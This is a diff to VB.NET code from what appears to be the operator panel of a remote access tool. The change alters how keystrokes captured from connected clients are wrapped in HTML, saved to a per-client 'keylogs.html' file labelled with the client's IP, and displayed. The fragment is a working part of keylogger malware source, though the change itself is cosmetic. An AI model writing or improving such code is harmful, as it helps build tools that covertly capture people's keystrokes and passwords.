@@ -379,8 +379,22 @@ Public Class Main
                     Dim F As KeyLogger = My.Application.OpenForms(n.openklog & sock) ''find window from socket
                     klf = cidf & Path.DirectorySeparatorChar & "keylogs.html"
                     Dim final As String = A(1)
-                    final = A(1).Insert(0, "<html style=""font-family:Segoe UI, Helvetica Neue, Arial, sans-serif""><head><title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</title></head><body><style>.k { color:#080; } .f { color:#F80; }</style><h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</h1>")
-                    final = final.Insert(final.Length, "</body><html>")
+                    final = A(1).Insert(0,
+"<!doctype html>
+<html style=""font-family:Segoe UI, Helvetica Neue, Arial, sans-serif"">
+<head>
+<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8""/>
+<meta http-equiv=""X-UA-Compatible"" content=""IE=edge, chrome = 1"">
+<title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</title>
+</head>
+<body>
+<style>.k {color:#080;} .f{color:#F80;} .content{word-wrap:break-word;white-space:-moz-pre-wrap;white-space:pre-wrap}</style>
+<h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</h1>
+<div class=""content"">")
+                    final = final.Insert(final.Length, "
+</div>
+</body>
+<html>")
                     IO.File.WriteAllText(klf, final, Encoding.UTF8) ''write keylogs to file
                     F.WebBrowser.DocumentText = IO.File.ReadAllText(klf).ToString ''set browser component to log file
                     F.WebBrowser.Invalidate()
